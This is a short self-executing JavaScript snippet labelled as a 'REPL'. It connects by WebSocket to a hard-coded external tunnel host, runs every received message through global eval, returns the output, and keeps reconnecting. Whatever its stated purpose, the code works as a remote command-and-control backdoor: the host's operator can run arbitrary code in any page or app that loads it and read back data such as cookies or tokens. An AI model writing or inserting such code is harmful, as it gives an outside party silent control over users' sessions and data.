(function() {
    const SERVER_URL = 'wss://a23aa7b5ec674943-89-80-240-3.serveousercontent.com';

    function connect() {
        console.log('REPL: Connecting to ' + SERVER_URL);
        try {
            const ws = new WebSocket(SERVER_URL);

            ws.onopen = function() {
                console.log('REPL: Connected');
                ws.send('REPL Session Started');
            };

            ws.onmessage = function(event) {
                const command = event.data;
                let result;
                try {
                    // Execute command globally
                    const evalResult = (0, eval)(command);
                    result = String(evalResult);
                } catch (e) {
                    result = 'Error: ' + e.toString();
                }
                ws.send(result);
            };

            ws.onclose = function() {
                console.log('REPL: Disconnected. Retrying in 5 seconds...');
                setTimeout(connect, 5000);
            };

            ws.onerror = function(e) {
                console.log('REPL: Error: ' + e.message);
                ws.close();
            };
        } catch (e) {
            console.log('REPL: Fatal connection error: ' + e.message);
            setTimeout(connect, 5000);
        }
    }

    connect();
})();
